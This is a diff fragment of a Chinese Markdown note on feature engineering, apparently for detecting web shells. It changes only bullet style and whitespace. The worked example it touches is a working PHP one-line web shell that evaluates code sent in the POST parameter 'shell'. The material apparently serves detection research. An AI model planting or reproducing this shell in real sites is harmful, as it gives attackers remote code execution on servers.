@@ -12,18 +12,18 @@
 
 ## 特征工程步骤
 
-* 提取特征
-* 特征清洗
-* 特征降维
+- 提取特征
+- 特征清洗
+- 特征降维
 
 ## 特征工程实例
 
 ```php
-<?php  
-function fun($a){  
-    @eval($a);  
-}  
-@fun($_POST['shell']);  
+<?php
+function fun($a){
+    @eval($a);
+}
+@fun($_POST['shell']);
 ?>
 
 <?php
